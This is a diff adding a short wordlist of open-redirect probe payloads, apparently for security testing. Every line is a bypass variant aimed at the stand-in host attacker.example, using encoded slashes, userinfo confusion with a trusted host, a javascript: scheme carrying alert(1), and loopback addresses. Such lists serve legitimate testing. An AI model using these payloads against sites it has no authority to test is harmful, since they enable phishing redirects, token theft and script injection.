@@ -1,0 +1,14 @@
+# redirect/open — open-redirect probes (replace target host as needed)
+//attacker.example
+//attacker.example/
+/\/attacker.example
+\/\/attacker.example
+//attacker.example%2f@trusted.example
+//attacker.example%2f%2f
+//attacker%E3%80%82example
+http://attacker.example
+https://attacker.example
+javascript://attacker.example/%0aalert(1)
+//attacker.example/.well-known/openid-configuration
+//127.0.0.1
+//[::1]
